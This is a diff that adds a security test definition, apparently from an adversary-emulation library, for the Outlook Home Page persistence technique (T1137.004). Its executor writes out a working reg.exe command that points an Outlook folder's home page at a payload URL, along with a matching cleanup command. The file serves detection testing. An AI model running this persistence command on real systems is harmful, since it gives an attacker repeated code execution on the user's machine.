@@ -1,0 +1,40 @@
+---
+attack_technique: T1137.004
+display_name: "Office Application Startup: Outlook Home Page"
+
+atomic_tests:
+- name: Install Outlook Home Page Persistence
+  auto_generated_guid: 7a91ad51-e6d2-4d43-9471-f26362f5738e
+  description: |
+    This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.
+
+    Triggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    url:
+      description: URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://)
+      type: string
+      default: file://PathToAtomicsFolder\T1137.004\src\T1137.004.html
+    outlook_version:
+      description: Version of Outlook that is installed 
+      type: string
+      default: 16.0
+      # Microsoft 365: 16.0
+      # Outlook 2019: 16.0
+      # Outlook 2016: 16.0
+      # Outlook 2013: 15.0
+    outlook_folder:
+      description: Name of the Outlook folder to modify the homepage setting for
+      type: string
+      default: Inbox
+      # Default folder names as they appear in the registry: https://support.microsoft.com/en-us/office/outlook-home-page-feature-is-missing-in-folder-properties-d207edb7-aa02-46c5-b608-5d9dbed9bd04
+
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f
+    cleanup_command: |
+      reg.exe delete HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /f
